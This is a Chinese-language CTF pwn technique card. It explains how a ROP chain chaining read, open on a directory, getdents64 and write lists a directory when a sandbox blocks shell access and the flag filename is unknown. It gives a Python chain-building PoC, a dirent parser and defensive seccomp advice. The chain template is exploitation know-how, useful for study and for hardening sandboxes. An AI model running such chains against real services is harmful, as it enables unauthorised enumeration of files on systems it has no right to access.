---
id: binary-pwn-rop-getdents64-directory-listing-unknown-flag-filename
title: flag 文件名未知时不靠 shell：ROP 用 read 把路径写进 bss → open 目录 → getdents64 把 dentry 列表读到 bss → write 输出，纯 syscall 链列出目录
type: scenario
domain: binary
path: binary/pwn/rop
technique: rop-open-dir-getdents64-write-list-unknown-filename
aliases:
- getdents64 列目录
- 远程 flag 文件名未知
- ROP 列目录找 flag
- open + getdents64 + write
- 无 shell 的目录枚举
- dentry 结构解析
tags:
- pwn
- rop
- ret2csu
- getdents64
- open
- seccomp
- orw
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:32:05+08:00'
  notes: 已对照原文核对；read 写路径→open 目录→getdents64(217)→write 四段 ROP 链、寄存器参数布局与 0x404500/0x400 常量均与正文 §5.3 片段一致，linux_dirent64 字段布局（d_ino/d_off/d_reclen/d_type/d_name）正确；本次核对未读取图片（原文 0 张图）；原文只给链片段、未给完整题目与回显，fd=3 与链可执行性未在真实环境验证（卡片已定 confidence=medium）；未执行文中命令或 PoC
---

## 一句话结论

当沙箱只放行 `open/read/write` 一类系统调用、拿不到 shell，而远程 flag 的文件名又不是 `flag`/`flag.txt` 这类已知值时，不必猜名字：先用一次 `read(0, bss, n)` 把目标目录（如 `0` 或 `/`）的字符串写进 bss，再 `open(bss, O_RDONLY|O_DIRECTORY)` 拿到目录 fd，接着 `getdents64(fd, buf, 0x400)` 把目录项数组读进 bss，最后 `write(1, buf, 0x400)` 打印出来。返回的缓冲区里每条 `linux_dirent64` 的 `d_name` 就是文件名，据此再发第二轮 `open/read/write` 精确读 flag。整条链只用 ROP gadget 拼参数，不需要可执行页，也不依赖 shell 的内建命令。

## 原理

- **目录也是文件**：`open` 一个目录路径（不带 `O_DIRECTORY` 也能成功，带上更稳）会返回可读的 fd；对该 fd 调 `getdents64`（x86-64 syscall 217）得到的是内核 `struct linux_dirent64` 数组，这与「用 shell 的 `echo *` 让 glob 帮你列目录」等价，但不需要 `execve`、不依赖 `/bin/sh` 是否存在。
- **`linux_dirent64` 布局**：`u64 d_ino; s64 d_off; u16 d_reclen; u8 d_type; char d_name[]`——即前 8 字节 inode，其后 8 字节偏移，再 2 字节本条长度、1 字节类型，从第 19 字节起是名字。名字以 `\0` 结尾，按 `d_reclen` 对齐到下一条。所以写出去之后人工看十六进制就能辨认文件名；脚本化时按 `d_reclen` 递推即可。
- **为什么必须先 read 一次路径**：ROP 链里没有「任意地址写字符串」的原语（除非有 write gadget）。用 `read(0, target, 0x100)` 让攻击者把路径字节直接送进 bss 是成本最低的做法，也顺便解决了「路径长度不定」的问题。
- **为什么用 bss 而不是栈**：`getdents64` 的输出长度取决于目录里有多少条目，可能远超当前 ROP 栈帧剩余空间，写到 bss 不会踩坏后续返回地址；同时 bss 地址在无 PIE 或已知基址的题里是常量，便于在链里直接编码。
- **参数怎么给**：`pop rdi; ret` 给 fd/路径，`pop rsi; ret` 给缓冲区，`pop rdx; pop rbx; ret`（或 `ret2csu`）给长度——`0x100`、`0x400` 这类值要写满一对寄存器时用 `*2` 的写法把同一个值同时塞进 `rdx`/`rbx`，是因为该 gadget 一次弹两个寄存器。
- **与 ORW 卡的区别**：普通 ORW 是「已知道文件名」的三步；本卡是「文件名未知」时先做一次目录枚举，多出 `open(dir)` + `getdents64` 两步，并且输出内容不是文件正文而是 dentry 结构，需要解析。

## 触发条件

- 存在栈溢出/ROP 条件（能控制返回地址链），有可用的 `pop rdi`、`pop rsi`、`pop rdx; pop rbx`（或 `ret2csu`、`__libc_csu_init`）等 gadget。
- 目标进程可读目录（`open` 目录成功），seccomp 未禁止 `getdents64`/`open`/`read`/`write`（很多「只放行 ORW」的沙箱会漏掉 `getdents64`）。
- 有一块可写、地址已知且足够大（≥0x400）的内存（bss/全局缓冲），用于存路径字符串与目录项。
- 沙箱内没有 shell，或 `execve`/`execveat` 被禁，无法用 `ls`/`echo *` 之类内建命令列目录。

## 利用步骤

1. 先用 `seccomp-tools dump ./pwn` 确认 `getdents64`(217) 与 `open`(2) 未在禁止名单里；若 `getdents64` 被禁，退化为猜文件名（`flag`、`flag.txt`、`/flag`）或用 `openat`。
2. 选定 bss 上的目标缓冲区地址（代码里已有的全局数组最省事），以及第一段输入点（用于写入目录路径字符串）。
3. 拼第一段：`pop rdi; 0` + `pop rsi; target` + `pop rdx;pop rbx; 0x100 ×2` + `read`，把目录路径（如 `0` 或 `/`）写进 `target`。
4. 拼第二段：`pop rdi; target` + `pop rsi; 0` + `pop rdx;pop rbx; 0 ×2` + `open`（`O_RDONLY`），返回值（目录 fd，通常是 3）留在 `rax`。
5. 拼第三段：`pop rdi; 3` + `pop rsi; 0x404500`（目录项缓冲）+ `pop rdx;pop rbx; 0x400 ×2` + `getdents64`，把 dentry 数组读进缓冲。
6. 拼第四段：`pop rdi; 1` + `pop rsi; 0x404500` + `pop rdx;pop rbx; 0x400 ×2` + `write`，把 dentry 原样打印。
7. 在输出里按 `linux_dirent64` 解析出 `d_name`（或直接看十六进制中的可打印串），拿到真实 flag 文件名后，再发一轮 `open/read/write` 精确读取。

## PoC

链的构造形态（gadget 名按题目实际符号替换，`read_addr`/`open_addr`/`write_addr` 为 PLT 或 syscall gadget）：

```python
p  = p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(target) \
   + p64(pop_rdx_rbx_ret) + p64(0x100) * 2 + p64(read_addr)
p += p64(pop_rdi_ret) + p64(target) + p64(pop_rsi_ret) + p64(0) \
   + p64(pop_rdx_rbx_ret) + p64(0x0) * 2 + p64(open_addr)
p += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x404500) \
   + p64(pop_rdx_rbx_ret) + p64(0x400) * 2 + p64(getdents64)
p += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(0x404500) \
   + p64(pop_rdx_rbx_ret) + p64(0x400) * 2 + p64(write_addr)
```

解析返回的目录项（离线对 `write` 输出做，或直接在 payload 里 `write` 到 stdout 后用脚本切）：

```python
def parse_dents(blob):
    off, names = 0, []
    while off + 19 <= len(blob):
        reclen = int.from_bytes(blob[off+16:off+18], 'little')
        if reclen < 19 or off + reclen > len(blob):
            break
        name = blob[off+19:off+reclen].split(b'\x00', 1)[0]
        if name:
            names.append(name.decode('latin-1'))
        off += reclen
    return names
```

## 变体与关联

- 目录 fd 的取得变体：`open("/")`、`open(".")`、`open("0")`（当题目把工作目录挂在 fd 0 之外）、或先 `chdir` 再 `open(".")`；若 `open` 被禁，用 `openat(AT_FDCWD, ...)` 或 `openat2`。
- 有 shell 但 `execve` 被禁的路线：让 sh 自己做 glob（`echo *`），由 `readdir`/`getdents` 完成枚举——见 [[binary-pwn-sandbox-escape-seccomp-execveat-shell-builtin-read]]；本卡是「没有 shell、只能用 ROP 拼 syscall」的等价方案。
- 输出受限的变体：`write` 被禁时改 `writev`/`sendfile`（把 dentry 缓冲当 iovec 或用 sendfile 只对普通文件有效，故枚举阶段仍优先 `writev`）；完全没有输出时退化到逐字节时间侧信道（见 [[binary-pwn-sandbox-escape-orw-flag-byte-bruteforce-time-clean-oracle]]）。
- 关联：[[binary-pwn-sandbox-escape-orw-missing-read-sendfile-preadv-mmap]]、[[binary-pwn-sandbox-escape-orw-missing-write-writev-pwritev]]（替代 syscall 清单）、[[binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch]]（无 `pop rdx` 时用 ret2csu 拼三参数）。

## 检测与防御

- **沙箱侧**：只放行 `open/read/write` 的白名单并不够，必须同时封掉 `getdents64`(217)、`getdents`(78)、`openat`(257)、`openat2`(437)，否则攻击者能在无 shell 的情况下枚举目录；更彻底的做法是只把 flag 文件以只读 fd 传入，不给任何目录访问。
- **文件布局**：flag 不要与可读目录同处；用独立挂载点/权限隔离，避免「拿到目录 fd 就能看到名字」。
- **检测特征**：一次连接内先出现 `open` 目录路径（`"."`、`"/"`、短字符串）的调用，紧接着 `getdents64` 与一次大长度 `write`；ROP 链中 `pop rdi/pop rsi/pop rdx` 连续出现且参数为固定常量（`3`、`0x404500`、`0x400`）。
